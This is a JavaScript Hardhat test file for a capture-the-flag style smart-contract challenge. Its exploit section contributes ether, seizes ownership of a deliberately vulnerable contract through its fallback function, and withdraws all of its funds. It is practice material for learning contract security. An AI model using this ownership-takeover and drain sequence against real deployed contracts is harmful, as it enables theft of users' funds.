const { ethers, network } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Example Vuln', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const InstanceFactory = await ethers.getContractFactory('ExampleFallback');
            this.target = InstanceFactory.attach("");
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const FallbackFactory = await ethers.getContractFactory('ExampleFallback', deployer);
            this.target = await FallbackFactory.deploy();
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        const some_ether = ethers.utils.parseEther('0.0001', 'ether');
        // Contribute to get into whitelist
        await this.target.connect(attacker).contribute({value: some_ether});
        // Takeover the contract's owner by sending some ethers
        tx = {
            to: this.target.address,
            value: some_ether
        };
        await attacker.sendTransaction(tx);
        // Withdraw all ethers in the contract
        await this.target.connect(attacker).withdraw();
    });

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(await this.target.owner()).eq(attacker.address);
    });
});